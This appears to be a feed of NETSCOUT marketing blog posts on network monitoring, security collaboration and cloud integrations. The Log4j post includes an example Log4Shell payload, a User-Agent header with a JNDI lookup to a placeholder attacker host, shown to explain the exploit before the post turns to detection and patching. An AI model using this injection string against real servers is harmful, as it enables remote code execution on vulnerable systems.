  <title>Enabling NetOps-SecOps Collaboration</title>
  <link>http://localhost:7996/blog/enabling-netops-secops-collaboration</link>
  <description>NetSecOps: Why collaboration is needed and the power of network-derived data to reduce mean time to response (MTTR)</description>
  <content:encoded><![CDATA[<p>IT organizations have always needed to evolve to meet the demands of everyday life. In recent years, it has become apparent that the next evolution is collaboration between network operations (NetOps) and security operations (SecOps). According to the recent EMA white paper “<a href="https://www.netscout.com/whitepaper/netsecops-aligning-networking-security-teams">NetSecOps: Aligning Networking and Security Teams to Ensure Digital Transformation</a>,” more than 75 percent of network and security teams have increased their level of collaboration in recent years. This is due to increased digital transformation, rapid growth in work-from-home operations, and data center automation, among other factors.</p>

<p>According to the EMA white paper, one of the main drivers for enabling this collaboration is network data. The paper points out that security teams need access to network data for many reasons, with the highest priority going to the following four elements:</p>

<ul>
	<li><strong>Network detection and response/network traffic analysis:</strong> To detect, investigate, respond to, and mitigate malicious activity</li>
	<li><strong>Incident response:</strong> To identify, contain, and remediate any incident while also being able to prevent the same type of incident from occurring again</li>
	<li><strong>Real-time packet payload analysis:</strong> To understand the communications between applications, servers, and end users on the network in real time</li>
	<li><strong>Forensic packet analysis: </strong>To understand the timeline of the incident, which helps teams understand the entire attack chain—from where it originated, to what data was possibly taken, to all the associated parties involved</li>
</ul>

<p>However, this is not a natural partnership, and there are some challenges to making it successful. One of the main challenges pointed out in this paper is data quality/authority issues. Both NetOps and SecOps need access to the correct information, as quickly as possible, and many organizations struggle with this. The difficulty is that each organization needs to view data from its own perspective, or what that organization feels is most important. Having one single source of truth is necessary, but the ability to view that data from the perspective you value most is what really makes this collaboration easier.&nbsp;</p>

<p>The EMA paper also lists some additional challenges worth considering, including</p>

<ul>
	<li>Cross-team skills gaps</li>
	<li>Architectural complexity</li>
	<li>Budget issues</li>
	<li>Lack of tools/technologies that enable collaboration</li>
</ul>

<p>Beyond the various challenges with this kind of NetOps/SecOps partnership, however, there are major benefits, including</p>

<ul>
	<li>Faster resolution of security issues</li>
	<li>Reduced security risk</li>
	<li>Operational efficiency</li>
	<li>Faster resolution of user experience/network performance issues</li>
</ul>

<p>“Things move faster with good collaboration. There are less roadblocks,” confirmed a network architect with a $100 billion bank who participated in the EMA study.</p>

<p><strong>How NETSCOUT Helps</strong></p>

<p>NETSCOUT believes in achieving comprehensive visibility without borders by enabling a single source of smart network-derived data, which we call Smart Data, for more efficient service assurance and cybersecurity. With a single source of shared data, both NetOps and SecOps can view the same network-derived data, with a lens on network and application performance via <a href="https://www.netscout.com/product/ngeniusone-platform">nGeniusONE</a> and a lens on cybersecurity via <a href="https://www.netscout.com/product/cyber-intelligence">Omnis Cyber Intelligence</a>, and can collaborate and quickly act on that data to prevent further damage to the organization.</p>

  <title>How Can Organizations with Hybrid Workforces Protect User Experience? </title>
  <link>http://localhost:7996/blog/protecting-hybrid-workforces-user-experience</link>
  <description>Today’s IT environments are so complex it’s difficult to determine whether problems are occurring at the client edge, network edge, or data center/cloud service edge. Smart edge monitoring will help.</description>
  <content:encoded><![CDATA[<p>In the early days of the COVID-19 pandemic, the workforce dramatically shifted to a work-from-home posture. But over the past several months, many companies have begun to bring their employees back to the office—at least on a part-time basis. This hybrid mix of remote and onsite work has become the new normal: A recent <a href="https://www.apollotechnical.com/hybrid-working-statistics/"> study </a> from Accenture found that 63 percent of high-growth companies have adopted a hybrid work model. These companies have put a premium on ensuring their workforce is both healthy and productive—an approach that is yielding bottom-line benefits.</p>

<p>The same study found that 83 percent of workers in general prefer a hybrid model. And even digitally native Gen Z employees want some onsite work. The report revealed that 74 percent of Gen Z respondents preferred to interact with colleagues in person, while 68 percent of baby boomers and 66 percent of Gen Xers stated a desire to work in a hybrid mode.</p>

<p><img alt="Video thumbnail: How can organizations with hybrid workforces protect end-user experience?" class="vidyard-player-embed" data-type="inline" data-uuid="41GTGKCBQydVY2Af7t2Vhb" data-v="4" src="https://play.vidyard.com/41GTGKCBQydVY2Af7t2Vhb.jpg" style="width: 100%; margin: auto; display: block;" /></p>

<p><strong>Hybrid Work Model Puts Onus on Delivering a Good End-User Experience </strong></p>

<p>As more and more employees are asked to adopt a hybrid work model, it is imperative to ensure they have the tools required to execute their jobs effectively. This means collaboration tools and business applications must deliver a superior end-user experience.</p>

<p>Unified communications and collaboration (UC&amp;C) systems are increasingly relied upon in this hybrid context. Another <a href="https://digitalintheround.com/video-conferencing-statistics/"> survey </a> found that 76 percent<strong> </strong>of employees use video conferencing for remote work. As corporate infrastructures become more complex, relying on multiple vendors to deliver vital services both to home and office workspaces, IT faces a large challenge in being able to identify and resolve problems quickly.</p>

<p>With a growing list of applications, including software as a service (SaaS), unified communications as a service (UCaaS), and data center-based services operating at the edge, IT organizations are under pressure to assure the end-user experience. To accomplish this, they need comprehensive visibility and integrated analysis throughout the transaction ecosystem.</p>

<p><strong>So Many Edges, So Little Visibility</strong></p>

<p>With so many edges in today’s IT environments, there are gaps in visibility that make it difficult to determine whether problems are occurring at the client edge, network edge, or data center/cloud service edge.</p>

<p>Traffic problems at these edges can result in delayed logins, slow responsiveness, and even outages in key business applications, all of which have the potential to negatively impact employee productivity and customer service.</p>

<p>As a result of the limited visibility across so many edges, IT needs vendor-agnostic tools that can quickly identify the source of issues. Smart edge monitoring is the answer to this dilemma.</p>

<p><strong>The Power of Monitoring Packet Data at the Edge and Synthetic Testing Data </strong></p>

<p>Smart edge monitoring results from bringing packet data, gathered at the edge, together with synthetic testing. NETSCOUT Smart Edge Monitoring is a new, patent-pending architecture that provides complete visibility and insights for IT teams to assure the highest-quality employee digital experience for any network or application, regardless of where users perform their jobs.</p>

<p>When performance problems begin to develop for the remote user, smart data transaction tests alert IT of a potential problem, which can be quickly resolved via the solution’s powerful service triage workflows. Early detection and rapid resolution of such problems reduces employee frustration and lost productivity and may even avoid broader-scale outages.</p>

<p>NETSCOUT is an industry leader in smart edge monitoring. Our Smart Edge Monitoring solution provides comprehensive, borderless monitoring and visibility and is the most effective way to assure the best end-user experience in today’s complex, hybrid workplaces.</p>

  <title>Are You Getting the Most Bang for Your IT Buck? </title>
  <link>http://localhost:7996/blog/are-you-getting-most-bang-your-it-buck</link>
  <description>VaaS experts can identify opportunities for expanded use of your enterprise technology, saving you money and increasing productivity while extending the value of your technology investments.</description>
  <content:encoded><![CDATA[<p>Back in early 2020, more than half of the respondents to a <a href="https://www2.deloitte.com/us/en/insights/focus/cio-insider-business-insights/impact-covid-19-technology-investments-budgets-spending.html"> Deloitte </a> survey on global technology leadership reported year-over-year budget increases between 2016 and 2020. Of course, what happened next changed things for many companies. The COVID-19 pandemic shifted the way business was done and how technology supported it. In some cases, budgets were slashed.</p>

<p>As 2022 approaches, many expect IT budget growth to resume in earnest. A recent <a href="https://swzd.com/resources/state-of-it/">report</a> revealed that 53 percent of businesses plan to increase technology spending year over year.</p>

<p>However, a growth in IT spend does not automatically guarantee a return on investment. Getting the most out of new technology is not a given. In certain instances, the lack of depth in that technology’s capabilities may lead an organization to source another tool or simply go without. In other cases, IT products that provide numerous capabilities and features are acquired for a subset of the intended mission, and useful features are never fully exploited. In both cases, IT is simply not getting the full bang for their investment dollars.</p>

<p><strong>Managed Monitoring Services Can Identify Opportunities for Expanded Use </strong></p>

<p>&nbsp;</p>

<p>Managed monitoring services can offer an answer to this dilemma. By leveraging a visibility-as-a-service (VaaS) solution, IT can tap into an outsourced expert that thoroughly understands the technology. VaaS experts can identify opportunities for expanded use of an enterprise’s technology, saving the company money and improving productivity while extending the value of the investment already made in that technology.</p>

<p>Take, for example, a healthcare provider that initially purchased a performance management solution to monitor, troubleshoot, and support reliable access to medical records and imaging. When the provider realized it had other essential applications that needed service assurance, it engaged a VaaS expert to discover how it could use the performance management solution for a new telemedicine application, as well as for unified communication and collaboration (UC&amp;C) services. Beyond these insights, VaaS provided much-needed visibility into the function of services within the provider’s other medical facilities, protecting the end-user experience and helping to ensure the highest quality of care.</p>

<p>VaaS enables IT to more easily manage complex, multivendor network environments, including private data centers, colocations, public cloud, remote offices, and wide area networks (WANs). Once problems are detected by VaaS monitoring, IT is notified and immediate action can then be taken to mitigate the issues. VaaS subject matter experts are able to refine alerting, allowing organizations to consolidate the number and frequency of alerts, reducing them into a single event that cuts down on time-consuming, overwhelming, repetitive alerts. This in turn enables IT to take corrective action more efficiently.</p>

<p>VaaS delivers further value through sharing of best practices on how to set up meaningful reports for executive audiences and incident response teams.</p>

<p><strong>NETSCOUT Is a VaaS Expert </strong></p>

<p>NETSCOUT is a VaaS expert, helping IT organizations to monitor, service triage, and gain critical data insights into business, industry, voice, video, and software-as-a-service (SaaS) application performance issues. NETSCOUT’s unparalleled depth of knowledge allows organizations to get the most use out of their existing service assurance deployments.</p>

<p>One customer, a director of operations for a global healthcare information technology solutions provider, explained it this way: “The insights NETSCOUT provided helped us improve our customer’s experience in delivering patient care.”</p>

  <title>Apache Log4j Vulnerability</title>
  <link>http://localhost:7996/blog/apache-log4j-vulnerability-exploitation</link>
  <description>Read about the Apache Log4j/Lo4Shell timeline and a recommended strategy to solve for this vulnerability.</description>
  <content:encoded><![CDATA[<p>Tick…</p>

<p>On Dec 9, 2021, the world was alerted to the Log4j vulnerability [CVE-2021-44228 aka Log4Shell].</p>

<p>Tock…</p>

<p>Most likely bad actors already knew about this prior to Dec 9<span style="font-size: 13.3333px;">th</span> as it’s been reported that the vulnerability was exposed much earlier in Minecraft chat forums.</p>

<p>The vulnerability exposes how the ubiquitous Log4j Java logging utility can be taken advantage of by injecting Java Naming and Directory Interface (JNDI) code in the User-Agent HTTP Header to execute a malicious script.</p>

<p>The JNDI injection can leverage different protocols such as Lightweight Directory Access Protocol (LDAP), Secure LDAP (LDAPS), Remote Method Invocation (RMI), or Domain Name Service (DNS) to request a malicious payload.</p>

<p>Here’s a simple unobfuscated example:</p>

<pre>
User-Agent: ${jndi:ladp://attacker site/malicious script}</pre>

<p> </p>

<p>Tick…</p>

<p>The vulnerability has attracted the world’s bad attackers (including ransomware-as-a-service gangs) as they can exploit it to download and execute common crypto mining malware, webshells, Cobalt Strike beacons - and undoubtedly ransomware.</p>

<p>Soon after the CVE was published, a v2.15.0 patch was provided for the Log4j utility.</p>

<p>Tock…</p>

<p>At this point both bad actors and defenders where in a race to scan for Apache servers running the vulnerable Log4j utility.  The Internet was awash in scanning activity and organizations were in a patch mode frenzy.</p>

<p>Tick..</p>

<p>Before most defenders could patch all their systems with v2.15.0, another vulnerability was published on Dec 14<span style="font-size: 13.3333px;">th</span> [CVE-2021-45046] and a new patch v2.16.0 was released.  Note: 2.16.0 disables all JNDI support by default and removes message lookup handling entirely. That’s a great step towards stopping this exploit, but once again defenders went into patch mode while bad actors continued to scan for vulnerable severs and exploit them. On Dec 17<span style="font-size: 11.6667px;">th</span>, Apache rolled out another patch v2.17.0 to address the most recent vulnerability CVE-2021-45105.</p>

<p>Tock..</p>

<p>Scanning and patching your vulnerable servers (if you can find them all) is absolutely the best defense against this exploit. But that takes time – a lot of time.  Therefore, it should be assumed that before or during this time, bad actors have already compromised one or more of your vulnerable servers. </p>

<p>Tick…</p>

<p>The time has come to focus your attention on the detecting exploitation.</p>

<p>Tock…</p>

<p>Undoubtedly you have many tools in your security stack that will help you detect and investigate signs of compromise.  Be it SIEMs, end point detection – or where NETSCOUT excels, packet-based threat detection and investigation – in a moment like this you’re going to leverage everything you have in your toolbox to detect and remediate the exploitation of the Log4j vulnerability.</p>

<h3>Your Needs from a Network Perspective</h3>

<p>Because of the ubiquity of potential vulnerable servers, you’ll need visibility across your entire network infrastructure - no matter where that network may reside – legacy, partner, private, public or hybrid cloud.</p>

<p>You’ll also need deep visibility into network traffic, including packet level visibility that can also automatically create a robust set of metadata that gives you visibility into all 7 layers of the OSI model and for many different protocols.</p>

<p>You’ll need the ability to continuously capture and store this robust set of packet-based metadata for real-time and retrospective analysis.  In fact, this capability should have started long before this event was made public on Dec 9<span style="font-size: 13.3333px;">th</span> so you’ll have the ability to go as far back in time as possible to look for signs of entry and exploitation.</p>

<p>You’ll need the ability to infuse this packet-based data with multiple sources of threat intelligence so you can automatically detect and conduct analysis of this data.</p>

<p>You'll want the ability to provide access or offload this robust set of packet-based data to data lakes where other tools in your toolbox can analyze it. </p>

<p>Because attackers will undoubtedly embed their communication inside encrypted tunnels, you’ll need the ability to conduct high performing decryption.</p>

<p>And lastly, you’ll want access to a vendor whose own tools are not vulnerable to this exploit and who will partner with you during this stressful time.</p>

<p><strong>NETSCOUT is that vendor and NETSCOUT Omnis Security</strong> is the solution to provide you with all these requirements. Here’s how…</p>

<h3>Smart Data is the Foundation of Omnis Security</h3>

<p>As stated previously, because of the ubiquitous nature of this vulnerability, you’re going to need comprehensive network visibility. That is, broad visibility across your entire digital infrastructure along with deep layer-7 visibility including packets. For over 30 years NETSCOUT’s core competency has been our ability to capture packets from the network- no matter the speed or where that network may reside (i.e. legacy, private cloud, or public cloud).  Using our patented <strong>Adaptive Service Intelligence (ASI)</strong> technology, in real-time, we extract from those packets a robust set of layer-7 metadata which we call <strong>Smart Data.</strong></p>

<p>The network instrumentation that accomplishes this are our <strong><a href="https://www.netscout.com/product/isng-platform">InfinistreamNG</a> (with Cyber Adaptor addon)</strong> and <strong>CyberStream</strong> products which come in a variety of models offering different network interface configurations, capture speeds (up to 100 Gbps), data storage capacities (up to 128 Terabytes), as appliances, software only, and virtually as <a href="https://www.netscout.com/product/vstream"><strong>vStream</strong></a> which supports common public cloud environments such as AWS, Azure and Google. This highly scalable instrumentation is strategically deployed throughout your entire network to provide comprehensive north-south and east-west visibility.</p>

<p>Both packets and Smart Data are stored locally on the network instrumentation. Using unique indexing and compression techniques enables us to store this data for long durations of time (e.g. months) so you can go back far before this Log4j event occurred to looks for early signs of entry and compromise.</p>

<h3>Omnis Cyber Intelligence is Your Control Center for Detection and Investigation</h3>

<p>Access to this robust set of network data is via our<strong> <a href="https://www.netscout.com/product/cyber-intelligence">Omnis Cyber Intelligence (OCI)</a></strong>, the central console for <a href="https://www.netscout.com/solutions/omnis-security">Omnis Security solution</a>. OCI conducts real-time analysis on the instrumentation’s (i.e. CyberStream, Infinistream and vStream) Smart Data looking for all types cyber security threats. Long before the Log4j CVE was known, OCI was acting as an <strong>Advanced Early Warning</strong> system as it was already analyzing the network data gathered by our instrumentation creating an inventory of all assets and looking for signs of exploitation.</p>

<p>Via our <strong>ATLAS Intelligence Feed (AIF)</strong> and 3rd parties supporting STIX/TAXII, OCI consumes threat intelligence and can be armed with millions of Indicators of Compromise (IoCs).  OCI uses this threat intelligence along with behavioral analysis to look for signs of compromise - or in this case signs of Log4j exploitation.</p>

<p>Specific to Log4j, the ATLAS Intelligence Feed (AIF), has over 1500 IoCs related to the exploit. As our ATLAS Security Engineering and Response Team (ASERT) gathers more intelligence, we will continue to update the feed accordingly.</p>

<p>Because OCI has comprehensive visibility across the entire network, it provides <strong>Continuous</strong> <strong>Attack Surface Monitoring</strong>.</p>

<p>OCI <strong>Protection Groups</strong> can be easily be configured to look specifically for all internet/external facing hosts (e.g. Web servers specifically running the Apache Log4j service). One can also customize the Protection Group’s packet and metadata storage parameters per server. With this scoped visibility, all traffic matching the protection group will be captured and analyzed in real-time or retrospectively.</p>

<p>OCI’s <strong>GeoFootprint </strong>feature can be used to clearly see all internal connections communicating with external sites. This display can be further filtered to show all existing external connections (including the most common protocols used for exploitation, such as HTTP/S and LDAP, RMI, DNS etc.) as well as any new connections over the previous 24 hours to identify irregular activity.</p>

<p>OCI’s real power is in its ability to conduct <strong>Contact Tracing and Go Back in Time Analysis. </strong>It accomplishes this by analyzing the goldmine of packets and Smart Data locally stored on the Infinistream, CyberStream and vStream instrumentation to conduct highly contextualized, metadata and packet-based investigations. Users can quickly scan through and analyze months of robust metadata or ultimately access the associated packets. This ability to access and analyze such a robust and high-fidelity source of data is unmatched in the industry and can certainly be leveraged by network and security teams who are earnestly trying to determine the extent of the Log4j exploitation and determine remediation efforts.</p>

<h3>Detection Alone is Not Enough</h3>

<p>Indeed, detecting signs of compromise and exploitation are required, but detection is not enough.  You need the ability to mitigate or block network communication that is attributing to the compromise. This is where our <strong>Omnis Arbor Edge Defense (AED)</strong> comes into play. <a href="https://www.netscout.com/product/netscout-aed">Omnis AED</a> is an industry best, stateless DDoS protection solution that you deploy on the edge of your network, just inside the internet router and outside the firewall. But AED can do much more than just block inbound DDoS attacks. Armed with the <strong>ATLAS Intelligence Feed</strong> as well as 3<span style="font-size: 11.6667px;">rd</span> party intelligence via STIX/TAXII, AED can be used to detect AND block non-DDoS threats such as those related to the Log4j exploit and many others.</p>

<p>AED’s unique position at the network edge enables it to act as a first and last line of defense for your organization:</p>

<ul><li><strong>First Line of Defense</strong>: AED can block known malicious inbound scanning, probing, brute force password attempts or millions of IoCs associated with the Log4j and other malware. Since AED sits northbound of your firewall, Intrusion Protection Systems and other network security devices, it takes the load off of those stateful systems which may be asked to do the same.</li>
	<li><strong>Last Line of Defense:</strong> AED can block outbound communication from compromised internal devices speaking to known bad locations. Since AED sits outside your firewall which is commonly the last piece of gear in your network security stack, when AED blocks this traffic, it means that all other security tools have missed it, thus acting as a last line of defense.</li>
</ul><p>Our <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="b0284809-4eb5-4d90-9897-6f27d22e9a77" href="http://localhost:7996/asert" title="ASERT">ATLAS Security and Research Team (ASERT) </a>receives anonymized information from customer deployments of AED. The day after they released the AIF with Log4j policies, they reported that AED had blocked <strong>over 1.7 million Log4j exploitation attempts</strong>.  Its this type of automated blocking functionality that gives defenders the chance to properly patch their vulnerable systems.</p>

<p><em>Note: As of the posting of this blog we have confirmation that AED has blocked over 8 million IoCs related to Log4j.</em></p>

<p>As more information about this exploit becomes available the potential for users to manually configure an AED RegEx countermeasure to block traffic specific to the Log4j exploit can also be executed.</p>

<h3>More NETSCOUT Solutions Can Help</h3>

<p>Since the bulk of the exploitation going on is HTTPs based, also with varying degrees of obfuscation, our <strong>nGenius Decryption Appliance (nDA)</strong> can play a valuable role in providing decryption and visibility into this traffic.</p>

<p>Our family of <strong>Packet Flow Switches (PFS) and Taps</strong> products can also play a crucial role in helping organizations intelligently send network traffic to NETSCOUT or 3rd party solutions for analysis.</p>

<p>When nDA combined with the NETSCOUT nGenius Packet Flow Switches, service chains comprised of multiple in-line or passive cybersecurity tools can be used to monitor multiple traffic flows simultaneously, including from disparate network areas.</p>

<h3>Impacted NETSCOUT Products</h3>

<p>And lastly, NETSCOUT is aware and tracking the vulnerability as it does affect some of our products.  We are keeping customers aware of potentially vulnerable products and their mitigation. Customers can find this information in our <strong>ATAC Knowledge Base Article ID 000019217</strong> - “<a href="https://arbor.custhelp.com/app/utils/login_form/redirect/home">Are NETSCOUT Products impacted by CVE-2021-44228</a>”  </p>

<h3>Looking Ahead</h3>

<p>We know you are in the midst of eradicating the Log4j vulnerability.  We know you have many other security tools at your disposal beyond NETSCOUT network-based protection. And we know there’s a ton of great information and guidance being provided to you for assistance.</p>

<p>For example, here’s the latest <a href="https://www.cisa.gov/uscert/ncas/current-activity/2021/12/22/mitigating-log4shell-and-other-log4j-related-vulnerabilities">guidance</a> from CISA, the Federal Bureau of Investigation (FBI), the National Security Agency (NSA), and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.</p>

<p>As you know, the best method to stop this exploit is to patch so continue to do so. But at the same time remain vigilant and actively looks for signs of compromise.</p>

<p>As <em>Guardians of the Connected World,</em> we at NETSCOUT want you to know we are here to help. As outlined, we have many excellent network and packet-based products that you can use to detect and remediate the exploitation of the Log4j vulnerability.</p>

  <title>Not All Security Providers Are Created Equal</title>
  <link>http://localhost:7996/blog/not-all-security-providers-are-created-equal</link>
  <description>Enterprises that work with ISO-certified security partners often see important benefits, such as fewer security breaches within their IT environment, which in turn reduces possible damage and resulting costs.</description>
  <content:encoded><![CDATA[<p>The cyberattacks keep coming. According to NETSCOUT’s latest <a href="https://www.netscout.com/threatreport"> Threat Intelligence Report </a> , an explosion of new distributed denial-of-service (DDoS) attack vectors has occurred recently, demonstrating the rapid innovation occurring within the ranks of threat actors.</p>

<p>These growing security threats have put a greater emphasis on the importance of choosing the right cybersecurity partner. Knowing which experts to work with can make the difference between adequately protecting your business and leaving yourself vulnerable to intrusions and catastrophic disruptions. This is where ISO 27001:2013 certification can help.</p>

<p><strong>What is ISO 27001:2013?</strong></p>

<p>ISO 27001:2013, which is the most up-to-date certification available, is an international standard that provides a framework on how to manage Information Security Management Systems (ISMS) in order to provide continued confidentiality, integrity, and availability of information, as well as legal compliance.</p>

<p>This highly respected certification demonstrates that a cybersecurity provider can be trusted to offer information risk processing and security management solutions that meet the most stringent industry standards.</p>

<p>Enterprises that decide to work with ISO-certified security partners often see important benefits, such as lowering the chances of security breaches within their IT environment, which in turn reduces possible damage and resulting costs. When security is improved, businesses are viewed as more trusted by partners, customers, and consumers.</p>

<p><strong>Security Should Extend Across Your Supply Chain</strong></p>

<p>Because businesses today are sharing an increasing volume of data with “trusted” partners, vendors, and suppliers, security vulnerabilities within the supply chain are taking on increased scrutiny. These partnerships create a wider array of attack entry points for bad actors.</p>

<p>Cybersecurity providers that have obtained ISO certification have tools in place to minimize supply chain cybersecurity attacks. Certification demonstrates that these companies have been scrutinized and tested and are highly adept at protecting their own data, as well as facilitating the protection of customer data.</p>

<p><strong>NETSCOUT Achieves ISO Certification for Security Management </strong></p>

<p>NETSCOUT has a long track record in security management solutions. We have been using the ISO 27001 framework for more than a decade. And as of 2021, NETSCOUT has successfully received ISO certification for our product development and technical operations, customer support, and business support functions. These specifically include:</p>

<ul>
	<li>Arbor Cloud</li>
	<li>Visibility-as-a-service (VaaS) services</li>
	<li>Service assurance</li>
	<li>Security products</li>
</ul>

<p>“We have been using the ISO 27001 framework for more than a decade,” says Deb Briggs, chief security officer for NETSCOUT. “Receiving this certification assures our customers that we have implemented security measures and countermeasures that protect us from unauthorized access or compromise. In addition, the third-party auditors found our IT staff to be conscientious and knowledgeable in best practices.”</p>

<p>ISO certification means NETSCOUT’s Information Management System was tested and met the stringent requirements. This certification demonstrates that we are dedicated to following the best practices of information security. We aim to protect our customers’ data throughout its lifetime, including all transactions as well as storage.</p>

<p><strong>Bringing Greater Intelligence to the Fight Against Cyberthreats </strong></p>

<p>NETSCOUT has leveraged the principles of ISO certification with the introduction of its innovative, scalable network security software solution, Omnis Cyber Intelligence (OCI). OCI is built on the foundation of the industry’s most prominent network monitoring and packet recording and analysis technology. It uniquely detects and investigates suspicious activities in real time and retrospectively, identifying threats before they spread.</p>

<p>Using market-leading visibility technology, OCI increases the range and depth of security intelligence and makes it accessible to security teams in real time.</p>

<p>“With enterprises worldwide facing threats to the availability, integrity, and confidentiality of customer data and information, we’ve built our culture to adhere to leading security management best practices to support our customers,” says Michael Szabados, chief operating officer for NETSCOUT. “It’s built into our DNA.”</p>

  <title>Why Collaboration is Needed (And Lacking) Between IT &amp; Security Teams</title>
  <link>http://localhost:7996/blog/why-collaboration-needed</link>
  <description>Enterprise network and security teams must collaborate to reduce risk to their organizations.</description>
  <content:encoded><![CDATA[<p>Enterprise network and security teams are facing an egregious increase in cyberattacks against their networks. Case in point: As of December 2021, more than 9 million Distributed Denial of Service (DDoS) attacks have been launched. (See NETSCOUT <a href="https://www.netscout.com/horizon">Omnis Threat Horizon</a> to see the latest DDoS attack statistics).</p>

<p>Unfortunately, the problems that cyberattacks create for enterprises are further exacerbated when IT and cybersecurity teams don't effectively collaborate. Failure to collaborate often has its genesis in how each team defines its role. While IT teams are tasked with ensuring an efficient experience for employees and customers, security teams are focused on protecting assets and addressing security issues.</p>

<p>One recent survey from <a href="https://www.netscout.com/whitepaper/esg-wp-network-security-without-borders"> Enterprise Strategy Group (ESG) </a> [download the whitepaper for full survey results] shows that 44% of cybersecurity and IT professionals say the relationship between IT and security doesn't work well at times for a number of reasons. Many cite that such issues stem from reporting structures that create conflicting agendas and impede cross collaboration. Likewise, budgetary conflicts, issues with compliance, and a lack of skilled workers on both teams make effective collaboration a challenge.</p>

<p>The question, then, is how both teams overcome these challenges to meet employee and customer expectations while also protecting resources from cyber attackers. When surveyed about how that might happen, 58% of IT and security teams say ensuring security personnel are included on IT projects from the start, while 38% said embedding security personnel into functional technology groups is key. Likewise, 35% say automating processes that promote collaboration between IT and security is needed.</p>

<p>Indeed, cross-silo collaboration is vital for enterprises that want to improve network performance, reduce security risk, and accelerate security incident detection and response. Effective collaboration gives both teams the ability to quickly and effectively determine whether an IT service event is a performance issue or a security incident – something that's sorely needed given the complex digital infrastructure of today's enterprises.</p>

<p>Moreover, cross-team collaboration drives cost and operational efficiencies, reduces overall risks, and quickens the pace for resolving security incidents. The more converged network and security teams are – and the more integrated the tools and processes used between them – the more successful they are at achieving these objectives.</p>

<p>To learn more about the importance of collaboration between IT and security teams, read the new white paper, <a href="https://www.netscout.com/sites/default/files/2021-11/SECWP_024_EN-2101%20-%20Why%20Cant%20We%20Be%20Friends.pdf"> <strong>Why Can't We Be Friends?</strong> </a> <strong> Enterprises Need Renewed Focus On Aligning IT And Cybersecurity </strong> , or <a href="https://www.netscout.com/contact-us">contact us</a> to learn more from one of our security experts.</p>

  <title>NETSCOUT Integration with AWS Security Hub Helps Improve the Corporate Security Posture in the Hybrid Cloud</title>
  <link>http://localhost:7996/blog/netscout-integration-aws-security-hub</link>
  <description>NETSCOUT collaborated with AWS to provide first-of-its-kind, end-through-end visibility across the hybrid cloud to efficiently mitigate security risks while decreasing operational overhead.</description>
  <content:encoded><![CDATA[<p>As enterprises accelerate their digital transformation, they rely more and more on the cloud’s elasticity and economies of scale to effectively achieve their business objectives. As they accelerate their workload migration to the cloud, however, the complexity of their hybrid infrastructure and attack surface increases.</p>

<p>The new hybrid infrastructure is composed of multiple domains and relies on a variety of geographically dispersed networks, clouds, services, and technologies—including wireline and wireless—and a plethora of tools. The borders across these domains inhibit visibility and make it harder to detect, analyze, and mitigate threats. Operational overhead and cost to business is compounded as the power, sophistication, and frequency of threats increase daily. Whatever the motivation, cyberthreats can cause severe financial harm and reputational damage and can disrupt business continuity. Strengthening the security posture and reducing business risk, therefore, requires a smart solution to illuminate threats everywhere, anywhere, at any time.</p>

<p>To address these challenges, NETSCOUT collaborated with Amazon Web Services (AWS) to provide first-of-its-kind end-through-end visibility across the hybrid cloud to efficiently mitigate security risks, while decreasing operational overhead. NETSCOUT integration with AWS Security Hub enables IT teams to scale business protection as infrastructure complexity grows, quickly, effectively, and efficiently detecting and mitigating risk associated with cyberthreats, whether on premises or in the cloud.</p>

<p>Cyberthreats and insights detected by NETSCOUT Omnis Cyber Intelligence (OCI) are displayed in AWS Security Hub, where security teams can quickly and easily execute highly contextual drilldowns into a robust set of metadata and packets to investigate these events further.&nbsp;</p>

<p>AWS Security Hub acts as a single location that aggregates, organizes, and prioritizes security alerts or findings from multiple AWS services and now, also, from NETSCOUT OCI. It serves as a compliance center for AWS customers and is designed as the first stop where AWS-focused security and compliance professionals go each day to understand their security and compliance state and see the “findings” of vendors that integrate into the hub.</p>

<p>As part of the integration, NETSCOUT is classified as a Findings Provider that sends its findings to Security Hub from within the AWS customer accounts.</p>

<p>The foundational technology that empowers NETSCOUT’s collaboration with AWS is virtual private cloud (VPC) traffic mirroring. Applying this technology in a variety of enterprise use cases in AWS enables practical, affordable, and scalable access to packet data for end-to-end security visibility in the hybrid cloud. For example, using seamless integration with AWS Gateway Load Balancer, NETSCOUT vSTREAM appliances can effectively access inter- and intra-VPC packet data traffic at scale and convert it into smart data, which OCI uses to deliver effective and cost-efficient vulnerability reports and threat detection as well as highly contextual, real-time or historical investigation capabilities to enterprises.</p>

<p>The NETSCOUT OCI platform uses a combination of smart data, derived from packet data (cloud, on-premises, and network edge), and indicators-of-compromise data based on NETSCOUT ATLAS Intelligence Feed and third-party threat intelligence feeds using STIX/TAXII. The combined data set enables security operations center (SOC) admins to detect and conduct highly contextual investigations of security risks and cyberthreats.</p>

<p>NETSCOUT OCI integration with AWS Security Hub increases security team productivity and enables security teams to intelligently reduce the risk associated with cyberthreats and attacks across complex hybrid cloud environments. The integrated solution also enhances SOC productivity by reducing the effort associated with collecting and prioritizing security findings and enabling integrated, context-rich, real-time, or historical investigations.</p>

<p>The strong technology alliance between NETSCOUT and AWS, combined with NETSCOUT OCI integration with AWS Security Hub, helps enterprises effectively improve their corporate security posture.</p>

<p>For additional information please refer to the press release “<a href="https://www.netscout.com/press-releases/netscout-omnis-cyber-intelligence-integrates-aws-security">NETSCOUT Omnis Cyber Intelligence Integrates with AWS Security Hub</a>” and check out the NETSCOUT OCI listing on <a href="https://aws.amazon.com/marketplace/pp/prodview-vp7zay7cpcr4w?sr=0-2&amp;ref_=beagle&amp;applicationId=AWSMPContessa">AWS Marketplace</a>.</p>

  <title>NETSCOUT Unveils New UCaaS Monitoring Capabilities for Collaboration Platforms to Support IT Productivity and Improve End-User Experiences</title>
  <link>http://localhost:7996/blog/netscout-unveils-new-ucaas-monitoring-capabilities</link>
  <description>NETSCOUT has released new UCaaS monitoring capabilities for collaboration platforms including Zoom, Cisco Webex, and Microsoft Teams to support IT productivity and improve end-user experiences.</description>
  <content:encoded><![CDATA[<p>NETSCOUT has released new Unified Communications-as-a-Service (UCaaS) capabilities for its Smart Edge Monitoring solution to help organizations ensure a quality employee experience with their work-from-home and hybrid workforce models using UCaaS solutions like Zoom, Cisco Webex, and Microsoft Teams.</p>

<p>Our Smart Edge Monitoring UCaaS capabilities use patent-pending technology to provide early detection of performance slow-downs with analysis throughout the complex communications ecosystem; including home-user networks, data centers, the cloud, and application data from UCaaS providers. It quickly pinpoints the source of problems facing end-users: at home, or in corporate or remote offices.</p>

